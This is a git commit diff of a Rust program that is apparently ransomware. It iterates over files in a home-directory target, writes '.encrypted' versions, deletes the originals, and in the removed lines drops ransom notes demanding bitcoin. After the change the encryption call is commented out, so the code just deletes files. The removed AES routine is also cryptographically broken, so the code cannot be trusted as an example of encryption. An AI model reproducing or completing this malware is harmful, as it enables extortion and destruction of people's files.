3b7d9e7409f6894d8d316eac68b57764bbf6b2e8
Dex <sheepareawesome777@gmail.com>
2023-03-11 22:58:02 -0500

    Switch to crate `orion`

--- src/main.rs
+++ src/main.rs
@@ -1,43 +1,21 @@
+use chacha20poly1305::{XChaCha20Poly1305, KeyInit, aead::stream};
 use dirs::home_dir;
 use std::error::Error;
-use std::fs;
+use std::fs::{self, File};
 use std::path::PathBuf;
 use std::io::prelude::*;
+use anyhow::Result;
+use orion::aead;
 
-use aes::Aes256;
-use cipher::{KeyInit, BlockEncrypt};
-use rand::rngs::OsRng;
-use rand::RngCore;
+fn encrypt_file() -> Result<()> {
+	let secret_key = aead::SecretKey::default();
+	let ciphertext = aead::seal(&secret_key, b"Secret message")?;
+	let decrypted_data = aead::open(&secret_key, &ciphertext)?;
 
-fn encrypt(data: &[u8], key: &[u8]) -> Vec<u8> {
-    let mut iv = [0u8; 16];
-    OsRng.fill_bytes(&mut iv); // generate a random IV
-
-    let cipher = Aes256::new(key.into());
-    let mut block = iv;
-    let mut encrypted_data = Vec::new();
-
-    // encrypt the data in CBC mode with PKCS#7 padding
-    for chunk in data.chunks(16) {
-        // XOR the previous block with the current plaintext block
-        block.iter_mut().zip(chunk.iter())
-            .for_each(|(b, &d)| *b ^= d);
-        
-        // encrypt the result and append it to the output
-        let mut block_array = [0u8; 16];
-        block_array.copy_from_slice(&block);
-        cipher.encrypt_block((&mut block_array).into());
-        encrypted_data.extend_from_slice(&block_array);
-    }
-
-    // append the IV to the output
-    encrypted_data.extend_from_slice(&iv);
-    encrypted_data
+	Ok(())
 }
 
-
 fn main() -> Result<(), Box<dyn Error>> {
-	let ransom_note = "YOUR FILES ARE ENCRYPTED. PAY 1 BITCOIN TO THE FOLLOWING ADDRESS TO GET THE DECRYPTION KEY.";
 	let encrypted_extension = ".encrypted";
 	let key = "INSERT_DECRYPTION_KEY_HERE";
 
@@ -49,8 +27,7 @@ fn main() -> Result<(), Box<dyn Error>> {
 
 	let entries = fs::read_dir(target_dir)?;
 	for entry in entries {
-		let entry = entry?;
-		let path = entry.path();
+		let path = entry?.path();
 
 		if path.is_file() {
 			let file_name = path.file_name().unwrap().to_str().unwrap();
@@ -62,13 +39,9 @@ fn main() -> Result<(), Box<dyn Error>> {
 
 				let encrypted_path =
 					PathBuf::from(format!("{}{}", path.display(), encrypted_extension));
-				fs::write(&encrypted_path, encrypt(&contents[..], key.as_bytes()))?;
+				//fs::write(&encrypted_path, encrypt(&contents[..], key.as_bytes()))?;
 
 				fs::remove_file(&path)?;
-
-				let mut ransom_file =
-					fs::File::create(format!("{}{}", encrypted_path.display(), ".ransom"))?;
-				ransom_file.write_all(ransom_note.as_bytes())?;
 			}
 		}
 	}
